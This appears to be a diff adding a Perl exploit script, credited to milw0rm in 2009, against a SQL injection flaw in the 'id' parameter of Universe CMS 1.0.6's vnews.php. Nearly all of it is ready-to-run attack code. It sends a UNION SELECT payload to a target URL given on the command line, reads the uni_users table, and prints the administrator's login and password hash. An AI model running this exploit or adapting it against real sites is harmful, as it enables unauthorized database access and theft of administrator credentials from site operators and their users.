@@ -1,0 +1,39 @@
+#!/usr/bin/perl -w
+# Universe CMS 1.0.6 (id) Remote SQL Injection Exploit
+# Demo : http://www.universe.uni.org.pl
+# Download : http://www.universe.uni.org.pl/upload/universecms106.rar
+# Found by : Mr.tro0oqy <Yemeni ana>
+# E-mail : t.4@windowslive.com
+# special thank for my teacher "Stack"
+########################################
+system("color e");
+print "\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n";
+print "\t\t0  Universe CMS 1.0.6 (id) Remote SQL Injection Exploit   0\n\n";
+print "\t\t0                       by Mr.tro0oqy                     0\n\n";
+print "\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n";
+use LWP::UserAgent;
+die "Example: perl $0 http://target.com/path \n" unless @ARGV;
+$user="login";
+$pass="password";
+$tab="uni_users";
+$b = LWP::UserAgent->new() or die "error\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+$host = $ARGV[0] . "/vnews.php?id=-1+union+select+1,2,3,4,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),".$pass.",CHAR(60,112,97,115,115,62)),6+from+".$tab."&print=1";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content;
+if ($answer =~ /<user>(.*?)<user>/){
+        print "\ loading .....\n";
+        print "\n[+] Admin User : $1";
+}
+if ($answer =~/<pass>(.*?)<pass>/)
+{
+print "\n[+] Admin Hash : $1\n\n";
+print "\t\t#   %100   #\n\n";}
+
+else
+{
+print "\n[-] Exploit Failed...\n";
+}
+
+# milw0rm.com [2009-07-09]
